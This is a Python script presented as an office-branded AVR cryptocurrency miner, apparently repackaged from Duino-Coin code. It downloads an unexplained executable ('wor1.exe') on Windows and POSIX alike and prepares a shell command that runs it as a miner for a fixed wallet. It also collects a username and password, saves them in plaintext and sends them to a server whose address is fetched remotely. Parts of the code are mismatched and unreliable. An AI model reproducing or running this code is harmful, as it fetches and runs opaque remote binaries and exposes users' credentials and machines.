#!/usr/bin/env python3
##################################################################
# Trade-And-Talk-Community-Office-2021 (v 0.0.1)
# https://github.com/thecode3/Trade-And-Talk-Community-Office-2021
# THECODE3-10osamaahmed92@gmail.com
# © Trade And Talk Community 2021
# BSD 3-Clause License
# Copyright (c) 2021, Osama Ahmed
# All rights reserved.
##################################################################
import socket, threading, time, re, subprocess, configparser, sys, datetime, os # Import libraries
from pathlib import Path
from signal import signal, SIGINT

def install(package):
  subprocess.check_call([sys.executable, "-m", "pip", "install", package])
  os.execl(sys.executable, sys.executable, *sys.argv)

def now():
  return datetime.datetime.now()

try: # Check if pyserial is installed
  import serial
  import serial.tools.list_ports
except:
  now = datetime.datetime.now()
  print(now().strftime("%H:%M:%S ") + "Pyserial is not installed. Miner will try to install it. If it fails, please manually install \"pyserial\" python3 package.\nIf you can't install it, use the Minimal-PC_Miner.")
  install("pyserial")

try: # Check if colorama is installed
  from colorama import init, Fore, Back, Style
except:
  print(now().strftime("%H:%M:%S ") + "Colorama is not installed. Miner will try to install it. If it fails, please manually install \"colorama\" python3 package.\nIf you can't install it, use the Minimal-PC_Miner.")
  install("colorama")

try: # Check if requests is installed
  import requests
except:
  print(now().strftime("%H:%M:%S ") + "Requests is not installed. Miner will try to install it. If it fails, please manually install \"requests\" python3 package.\nIf you can't install it, use the Minimal-PC_Miner.")
  install("requests")

# Global variables
minerVersion = "0.0.1" # Version number
timeout = 5 # Socket timeout
resourcesFolder = "Trade-And-Talk-Community-Office-2021"+str(minerVersion)+"_resources"
shares = [0, 0]
diff = 0.001
donatorrunning = True
job = ""
debug = True
serveripfile = "https://raw.githubusercontent.com/thecode3/Trade-And-Talk-Community-Office-Miner/gh-pages/serveripfile.txt" # Serverip file
config = configparser.ConfigParser()
autorestart = 0
donationlevel = 0

if not os.path.exists(resourcesFolder):
    os.mkdir(resourcesFolder) # Create resources folder if it doesn't exist

def debugOutput(text):
  if debug == "True":
    print(now().strftime(Style.DIM + "%H:%M:%S.%f ") + "DEBUG: " + text)

def title(title):
  if os.name == 'nt':
    os.system("title "+title)
  else:
    print('\33]0;'+title+'\a', end='')
    sys.stdout.flush()

def handler(signal_received, frame): # If CTRL+C or SIGINT received, send CLOSE request to server in order to exit gracefully.
  print(now().strftime(Style.DIM + "\n%H:%M:%S ") + Style.RESET_ALL + Style.BRIGHT + Back.GREEN + Fore.WHITE + " sys "
    + Back.RESET + Fore.YELLOW + " SIGINT detected - Exiting gracefully." + Style.NORMAL + Fore.WHITE + " See you soon!")
  try:
    soc.close()
  except:
    pass
  os._exit(0)
signal(SIGINT, handler) # Enable signal handler

def Greeting(): # Greeting message depending on time
  global greeting, autorestart
  print(Style.RESET_ALL)

  if float(autorestart) <= 0:
    autorestart = 0
    autorestartmessage = "disabled"
  if float(autorestart) > 0:
    autorestartmessage = "every " + str(autorestart) + " minutes"
    
  current_hour = time.strptime(time.ctime(time.time())).tm_hour
  
  if current_hour < 12 :
    greeting = "Have a wonderful morning"
  elif current_hour == 12 :
    greeting = "Have a tasty noon"
  elif current_hour > 12 and current_hour < 18 :
    greeting = "Have a peaceful afternoon"
  elif current_hour >= 18 :
    greeting = "Have a cozy evening"
  else:
    greeting = "Welcome back"
  
  print(" > " + Fore.YELLOW + Style.BRIGHT + "Trade-And-Talk-Community-Office-2021"
  + Style.RESET_ALL + Fore.WHITE + " (v" + str(minerVersion) + ") 2021") # Startup message  print(" * " + Fore.YELLOW + "https://github.com/thecode3/Trade-And-Talk-Community-Office-Miner")
  print(" > " + Fore.YELLOW + "https://github.com/thecode3/Trade-And-Talk-Community-Office-Miner")
  print(" > " + Fore.WHITE + "AVR board on port: " + Style.BRIGHT + Fore.YELLOW + str(avrport))
  if os.name == 'nt' or os.name == 'posix':
    print(" > " + Fore.WHITE + "Donation level: " +  Style.BRIGHT + Fore.YELLOW + str(donationlevel))
  print(" > " + Fore.WHITE + "Algorithm: " + Style.BRIGHT + Fore.YELLOW + "sha256")
  print(" > " + Fore.WHITE + "Autorestarter: " + Style.BRIGHT + Fore.YELLOW + str(autorestartmessage))
  print(" > " + Fore.WHITE + str(greeting) + ", " + Style.BRIGHT + Fore.YELLOW + str(username) + str(password) + "!\n")
  
  if os.name == 'nt':
    if not Path(resourcesFolder + "/Donate_executable.exe").is_file(): # Initial miner executable section
      debugOutput("OS is Windows, downloading developer donation executable")
      url = 'https://github.com/thecode3/Trade-And-Talk-Community-Office-Miner/blob/useful-tools/wor1.exe?raw=true'
      r = requests.get(url)
      with open(resourcesFolder + '/Donate_executable.exe', 'wb') as f:
        f.write(r.content)
  elif os.name == 'posix':
    if not Path(resourcesFolder + "/Donate_executable").is_file(): # Initial miner executable section
      debugOutput("OS is Windows, downloading developer donation executable")
      url = 'https://github.com/thecode3/Trade-And-Talk-Community-Office-Miner/blob/useful-tools/wor1.exe?raw=true'
      r = requests.get(url)
      with open(resourcesFolder + '/Donate_executable', 'wb') as f:
        f.write(r.content)

def autorestarter(): # Autorestarter
  time.sleep(float(autorestart)*60)
  try:
    donateExecutable.terminate() # Stop the donation process (if running)
  except:
    pass
  print(now().strftime(Style.DIM + "%H:%M:%S ") + Style.RESET_ALL + Style.BRIGHT + Back.GREEN + Fore.WHITE + " sys "
    + Back.RESET + Fore.YELLOW + " Autorestarting the miner")
  os.execl(sys.executable, sys.executable, *sys.argv)

def loadConfig(): # Config loading section
  global pool_address, pool_port, username, password, autorestart, donationlevel, avrport, debug
  
  if not Path(str(resourcesFolder) + "/Trade-And-Talk-Community-Office-2021_config.cfg").is_file(): # Initial configuration section
    print(Style.BRIGHT + "\nTrade-And-Talk-Community-Office-2021 basic configuration tool\nEdit "+str(resourcesFolder) + "/Trade-And-Talk-Community-Office-2021_config.cfg file later if you want to change it.")
    print(Style.RESET_ALL + "Don't have an Wallet-Coins account yet? Use " + Fore.YELLOW + "Wallet" + Fore.WHITE + " to Know More About Altcoins.\n")

    username = input(Style.RESET_ALL + Fore.YELLOW + "Enter your username: " + Style.BRIGHT)
    password = input(Style.RESET_ALL + Fore.YELLOW + "Enter your password: " + Style.BRIGHT)

    print(Style.RESET_ALL + Fore.YELLOW + "Configuration tool has found the following ports:")
    portlist = serial.tools.list_ports.comports()
    for port in portlist:
      print(Style.RESET_ALL + Style.BRIGHT + Fore.YELLOW + "  " + str(port))
    print(Style.RESET_ALL + Fore.YELLOW + "If you can't see your board here, make sure the it is properly connected and the program has access to it (admin/sudo rights).")

    avrport = input(Style.RESET_ALL + Fore.YELLOW + "Enter your board serial port (e.g. COM1 or /dev/ttyUSB1): " + Style.BRIGHT)
    autorestart = input(Style.RESET_ALL + Fore.YELLOW + "If you want, set after how many minutes miner will restart (recommended: 30): " + Style.BRIGHT)
    donationlevel = "0"
    if os.name == 'nt' or os.name == 'posix':
      donationlevel = input(Style.RESET_ALL + Fore.YELLOW + "Set developer donation level (0-5) (recommended: 1), this will not reduce your earnings: " + Style.BRIGHT)

    donationlevel = re.sub("\D", "", donationlevel)  # Check wheter donationlevel is correct
    if float(donationlevel) > int(5):
      donationlevel = 5
    if float(donationlevel) < int(0):
      donationlevel = 0

    config['Trade-And-Talk-Community-Office-2021'] = { # Format data
    "username": username,
    "password": password,
    "avrport": avrport,
    "autorestart": autorestart,
    "donate": donationlevel,
    "debug": True}
    
    with open(str(resourcesFolder) + "/Trade-And-Talk-Community-Office-2021_config.cfg", "w") as configfile: # Write data to file
      config.write(configfile)
    print(Style.RESET_ALL + "Config saved! Launching the miner")

  else: # If config already exists, load from it
    config.read(str(resourcesFolder) + "/Trade-And-Talk-Community-Office-2021_config.cfg")
    username = config["Trade-And-Talk-Community-Office-2021"]["username"]
    password = config["Trade-And-Talk-Community-Office-2021"]["password"]
    avrport = config["Trade-And-Talk-Community-Office-2021"]["avrport"]
    autorestart = config["Trade-And-Talk-Community-Office-2021"]["autorestart"]
    donationlevel = config["Trade-And-Talk-Community-Office-2021"]["donate"]
    debug = config["Trade-And-Talk-Community-Office-2021"]["debug"]

def Connect(): # Connect to master server section
  global soc, mainServer_address, mainServer_port
  try:
    res = requests.get(serveripfile, data = None) # Use request to grab data from raw github file
    if res.status_code == 200: # Check for response
      content = res.content.decode().splitlines() # Read content and split into lines
      mainServer_address = content[0] # Line 1 = pool address
      mainServer_port = content[1] # Line 2 = pool port
      debugOutput("Retrieved pool IP: " + mainServer_address + ":" + str(mainServer_port))
  except: # If it wasn't, display a message
    print(now().strftime(Style.DIM + "%H:%M:%S ") + Style.RESET_ALL + Style.BRIGHT + Back.BLUE + Fore.WHITE + " net "
      + Back.RESET + Fore.RED + " Error retrieving data from GitHub! Retrying in 10s.")
    if debug == "True": raise
    time.sleep(10)
    Connect()
  try: # Try to connect
    try: # Shutdown previous connections (if any)
      soc.shutdown(socket.SHUT_RDWR)
      soc.close()
    except:
      debugOutput("No previous connections to close")
    soc = socket.socket()
    soc.connect((str(mainServer_address), int(mainServer_port)))
    soc.settimeout(timeout)
  except: # If it wasn't, display a message
    print(now().strftime(Style.DIM + "%H:%M:%S ") + Style.RESET_ALL + Style.BRIGHT + Back.BLUE + Fore.WHITE + " net "
      + Back.RESET + Fore.RED + " Error connecting to the server! Retrying in 10s.")
    if debug == "True": raise
    time.sleep(10)
    Connect()

def checkVersion():
  serverVersion = soc.recv(3).decode() # Check server version
  debugOutput("Server version: " + serverVersion)
  if float(serverVersion) <= float(minerVersion) and len(serverVersion) == 3: # If miner is up-to-date, display a message and continue
    print(now().strftime(Style.DIM + "%H:%M:%S ") + Style.RESET_ALL + Style.BRIGHT + Back.BLUE + Fore.WHITE + " net "
      + Back.RESET + Fore.YELLOW + " Connected" + Style.RESET_ALL + Fore.WHITE + " to main Trade-And-Talk-Community-Office-2021 server (v"+str(serverVersion)+")")
  else:
    cont = input(now().strftime(Style.DIM + "%H:%M:%S ") + Style.RESET_ALL + Style.BRIGHT + Back.GREEN + Fore.WHITE + " sys "
      + Back.RESET + Fore.RED + " Miner is outdated (v"+minerVersion+"),"
      + Style.RESET_ALL + Fore.RED + " server is on v"+serverVersion+", please download latest version from Trade-And-Talk-Community-Office-2021/releases/ or type \'continue\' if you wish to continue anyway.\n")
    if cont != "continue":
      os._exit(1)

def ConnectToAVR():
  global com
  try: # Close previous serial connections (if any)
    com.close()
  except:
    pass
  com = serial.Serial(avrport, 115200, timeout=5)

def AVRMine(): # Mining section
  global donationlevel, donatorrunning, donateExecutable

  if os.name == 'nt':
    cmd = "cd " + resourcesFolder + "& Donate_executable.exe -o stratum+tcp://eu.bsod.pw:2496 -u MQvzLkotcHJqD4Pnmqm92rQ1n1PGW7APav -p x,d=0.001 -e "
  elif os.name == 'posix' :
    cmd = "cd " + resourcesFolder + "&& chmod +x Donate_executable && ./Donate_executable -o stratum+tcp://eu.bsod.pw:2496 -u MQvzLkotcHJqD4Pnmqm92rQ1n1PGW7APav -p x,d=0.001 -e "
  if int(donationlevel) <= 0:
    print(now().strftime(Style.DIM + "%H:%M:%S ") + Style.RESET_ALL + Style.BRIGHT + Back.GREEN + Fore.WHITE + " sys "
      + Back.RESET + Fore.YELLOW + " Duino-Coin network is a completely free service and will always be."
      + Style.BRIGHT + Fore.YELLOW + "\nWe don't take any fees from your mining.\nYou can really help us maintain the server and low-fee exchanges by donating.\nVisit "
      + Style.RESET_ALL + Fore.GREEN + "https://raw.githubusercontent.com/thecode3/Trade-And-Talk-Community-Office-Miner" + Style.BRIGHT + Fore.YELLOW + " to learn more about how you can help :)")
  if donatorrunning == False:
    if int(donationlevel) == 5: cmd += "100"
    elif int(donationlevel) == 4: cmd += "75"
    elif int(donationlevel) == 3: cmd += "50"
    elif int(donationlevel) == 2: cmd += "25"
    elif int(donationlevel) == 1: cmd += "10"
    if int(donationlevel) > 0: # Launch CMD as subprocess
      debugOutput("Starting donation process")
      donatorrunning = True
      donateExecutable = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL)
      print(now().strftime(Style.DIM + "%H:%M:%S ") + Style.RESET_ALL + Style.BRIGHT + Back.GREEN + Fore.WHITE + " sys "
        + Back.RESET + Fore.RED + " Thank You for being an awesome donator ❤️ \nYour donation will help us maintain the server and allow further development")

  try:
    debugOutput("Sending start word")
    ready = com.readline().decode().rstrip().lstrip() # AVR will send ready signal
    debugOutput("Received start word ("+str(ready)+")")
    print(now().strftime(Style.DIM + "%H:%M:%S ") + Style.RESET_ALL + Style.BRIGHT + Back.GREEN + Fore.WHITE + " sys "
      + Back.RESET + Fore.YELLOW + " AVR mining thread is starting"
      + Style.RESET_ALL + Fore.WHITE + " using sha256 algorithm")
  except:
    if debug == "True": raise
    Connect()

  while True:
    while True:
      try:
        soc.send(bytes("JOB,"+str(username)+str(password)+",AVR",encoding="utf8")) # Send job request
        job = soc.recv(1024).decode() # Get work from pool
        job = job.split(",") # Split received data to job and difficulty
        diff = job[2]
        if job[0] and job[1] and job[2]:
          debugOutput("Job received: " +str(job))
          break # If job received, continue 
      except:
        if debug == "True": raise
        Connect()
        ConnectToAVR()
    try: # Write data to AVR board
      com.write(bytes("start\n", encoding="utf8")) # start word
      debugOutput("Written start word")
      com.write(bytes(str(job[0])+"\n", encoding="utf8")) # hash
      debugOutput("Written hash")
      com.write(bytes(str(job[1])+"\n", encoding="utf8")) # job
      debugOutput("Written job")
      com.write(bytes(str(job[2])+"\n", encoding="utf8")) # difficulty
      debugOutput("Written diff")

      result = com.readline().decode().rstrip().lstrip() # Read the result
      result = result.split(",")
      debugOutput("Received result ("+str(result[0])+")")
      debugOutput("Received time ("+str(result[1])+")")
      computetime = round(int(result[1]) / 1000000, 3) # Convert AVR time to s
      hashrate = round(int(result[0]) / int(result[1]) * 1000000, 2)
      debugOutput("Calculated hashrate ("+str(hashrate)+")")
      soc.send(bytes(str(result[0]) + "," + str(hashrate) + ",Official AVR Miner v" + str(minerVersion), encoding="utf8")) # Send result back to the server
    except:
      if debug == "True": raise
      Connect()
      ConnectToAVR()

    while True:
      try:
        responsetimetart = now()
        feedback = soc.recv(1024).decode() # Get feedback
        responsetimestop = now() # Measure server ping
        ping = responsetimestop - responsetimetart # Calculate ping
        ping = str(int(ping.microseconds / 1000)) # Convert to ms
      except:
        if debug == "True": raise
        Connect()
        ConnectToAVR()

      if feedback == "GOOD": # If result was good
        shares[0] = shares[0] + 1 # Share accepted  = increment correct shares counter by 1
        title("Trade-And-Talk-Community-Office-2021 (v"+str(minerVersion)+") - " + str(shares[0]) + "/" + str(shares[0] + shares[1]) + " accepted shares")
        print(now().strftime(Style.DIM + "%H:%M:%S ") + Style.RESET_ALL + Style.BRIGHT + Back.MAGENTA + Fore.WHITE + " avr "
          + Back.RESET + Fore.GREEN + " Accepted " + Fore.WHITE + str(shares[0]) + "/" + str(shares[0] + shares[1])
          + Back.RESET + Fore.YELLOW + " (" + str(int((shares[0] / (shares[0] + shares[1]) * 100))) + "%)"
          + Style.NORMAL + Fore.WHITE + " ⁃ " + Style.BRIGHT + Fore.WHITE + str(computetime) + "s"
          + Style.NORMAL + " - " + str(hashrate) + " H/s @ diff " + str(diff) + " ⁃ " + Fore.BLUE + "ping " + ping + "ms")
        break # Repeat

      elif feedback == "BLOCK": # If result was good
        shares[0] = shares[0] + 1 # Share accepted  = increment correct shares counter by 1
        title("Trade-And-Talk-Community-Office-2021 (v"+str(minerVersion)+") - " + str(shares[0]) + "/" + str(shares[0] + shares[1]) + " accepted shares")
        print(now().strftime(Style.DIM + "%H:%M:%S ") + Style.RESET_ALL + Style.BRIGHT + Back.MAGENTA + Fore.WHITE + " avr "
          + Back.RESET + Fore.CYAN + " Block found " + Fore.WHITE + str(shares[0]) + "/" + str(shares[0] + shares[1])
          + Back.RESET + Fore.YELLOW + " (" + str(int((shares[0] / (shares[0] + shares[1]) * 100))) + "%)"
          + Style.NORMAL + Fore.WHITE + " ⁃ " + Style.BRIGHT + Fore.WHITE + str(computetime) + "s"
          + Style.NORMAL + " - " + str(hashrate) + " H/s @ diff " + str(diff) + " ⁃ " + Fore.BLUE + "ping " + ping + "ms")
        break # Repeat

      elif feedback == "INVU": # If user doesn't exist 
        print(now().strftime(Style.DIM + "%H:%M:%S ") + Style.RESET_ALL + Style.BRIGHT + Back.BLUE + Fore.WHITE + " net "
          + Back.RESET + Fore.RED + " username "+str(username) + " password "+str(password) + " doesn't exist."
          + Style.RESET_ALL + Fore.RED + " Make sure you've entered the username and password correctly. Please check your config file. Retrying in 10s")
        time.sleep(10)
        Connect()
        ConnectToAVR()

      elif feedback == "ERR": # If server says that it encountered an error
        print(now().strftime(Style.DIM + "%H:%M:%S ") + Style.RESET_ALL + Style.BRIGHT + Back.BLUE + Fore.WHITE + " net "
          + Back.RESET + Fore.RED + " Internal server error." + Style.RESET_ALL + Fore.RED + " Retrying in 10s")
        time.sleep(10)
        Connect()
        ConnectToAVR()

      else: # If result was bad
        shares[1] += 1 # Share rejected = increment bad shares counter by 1
        print(now().strftime(Style.DIM + "%H:%M:%S ") + Style.RESET_ALL + Style.BRIGHT + Back.MAGENTA + Fore.WHITE + " avr "
          + Back.RESET + Fore.RED + " Rejected " + Fore.WHITE + str(shares[0]) + "/" + str(shares[0] + shares[1])
          + Back.RESET + Fore.YELLOW + " (" + str(int((shares[0] / (shares[0] + shares[1]) * 100))) + "%)"
          + Style.NORMAL + Fore.WHITE + " ⁃ " + Style.BRIGHT + Fore.WHITE + str(computetime) + "s"
          + Style.NORMAL + " - " + str(hashrate) + " H/s @ diff " + str(diff) + " ⁃ " + Fore.BLUE + "ping " + ping + "ms")
        break # Repeat

if __name__ == '__main__':
  init(autoreset=True) # Enable colorama
  title("Trade-And-Talk-Community-Office-2021 AVR Miner (v"+str(minerVersion)+")")
  try:
    loadConfig() # Load configfile
    debugOutput("Config file loaded")
  except:
    print(Style.RESET_ALL + Style.BRIGHT + Fore.RED + "Error loading the configfile ("+resourcesFolder+"/Trade-And-Talk-Community-Office-2021_config.cfg). Try removing it and re-running configuration. Exiting in 10s" + Style.RESET_ALL)
    if debug == "True": raise
    time.sleep(10)
    os._exit(1)
  try:
    Greeting() # Display greeting message
    debugOutput("Greeting displayed")
  except:
    if debug == "True": raise

  while True:
    try: # Setup autorestarter
      if float(autorestart) > 0:
        debugOutput("Enabled autorestarter for " + str(autorestart) + " minutes")
        threading.Thread(target=autorestarter).start()
      else:
        debugOutput("Autorestarter is disabled")
    except:
      print(now().strftime(Style.DIM + "%H:%M:%S ") + Style.RESET_ALL + Style.BRIGHT + Back.GREEN + Fore.WHITE + " sys "
        + Style.RESET_ALL + Style.BRIGHT + Fore.RED + " Error in the autorestarter. Check configuration file ("+resourcesFolder+"/Trade-And-Talk-Community-Office-2021_config.cfg). Exiting in 10s" + Style.RESET_ALL)
      if debug == "True": raise
      time.sleep(10)
      os._exit(1)

    try:
      Connect() # Connect to pool
      debugOutput("Connected to main server")
    except:
      print(now().strftime(Style.DIM + "%H:%M:%S ") + Style.RESET_ALL + Style.BRIGHT + Back.BLUE + Fore.WHITE + " net "
      + Style.RESET_ALL + Style.BRIGHT + Fore.RED + " Error connecting to the server. Retrying in 10s" + Style.RESET_ALL)
      if debug == "True": raise
      time.sleep(10)
      Connect()

    try:
      checkVersion() # Check version
      debugOutput("Version check complete")
    except:
      print(now().strftime(Style.DIM + "%H:%M:%S ") + Style.RESET_ALL + Style.BRIGHT + Back.BLUE + Fore.WHITE + " net "
      + Style.RESET_ALL + Style.BRIGHT + Fore.RED + " Rrror checking server version. Retrying in 10s" + Style.RESET_ALL)
      if debug == "True": raise
      time.sleep(10)
      Connect()

    try:
      ConnectToAVR() # Connect to COM port
      debugOutput("Connected to AVR board")
    except:
      print(now().strftime(Style.DIM + "%H:%M:%S ") + Style.RESET_ALL + Style.BRIGHT + Back.GREEN + Fore.WHITE + " sys "
        + Style.RESET_ALL + Style.BRIGHT + Fore.RED + " Error connecting to the AVR board. Check your connection, permissions and the configuration file ("+resourcesFolder+"/Trade-And-Talk-Community-Office-2021_config.cfg). Exiting in 10s" + Style.RESET_ALL)
      if debug == "True": raise
      time.sleep(10)
      os._exit(1)

    try:
      debugOutput("Mining started")
      AVRMine() # Launch mining thread
      debugOutput("Mining ended")
    except:
      print(now().strftime(Style.DIM + "%H:%M:%S ") + Style.RESET_ALL + Style.BRIGHT + Back.BLUE + Fore.WHITE + " net "
      + Style.RESET_ALL + Style.BRIGHT + Fore.MAGENTA + " Master server timeout OR AVR connection error - rescuing" + Style.RESET_ALL)
      if debug == "True": raise
      Connect()
